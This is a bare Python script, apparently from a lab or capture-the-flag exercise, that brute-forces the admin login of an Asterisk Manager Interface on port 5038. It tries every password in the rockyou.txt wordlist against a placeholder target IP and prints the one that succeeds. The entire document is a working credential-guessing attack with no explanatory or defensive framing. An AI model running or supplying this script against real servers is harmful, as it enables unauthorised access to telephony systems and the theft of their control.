import socket

target = "[TARGET IP]"
port = 5038

with open("rockyou.txt") as f:
    for line in f:
        pw = line.replace("\n","")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.recv(1024)

        string = "ACTION: LOGIN\nUSERNAME: admin\nSECRET: {}\nEVENTS: ON\n\n".format(pw)
        print(string)
        s.sendall(str.encode(string))
        result = s.recv(1024)

        print(result.decode("utf-8"))
        if(not "failed" in result.decode("utf-8")):
            print(pw + " is the password")
            break

        s.close()
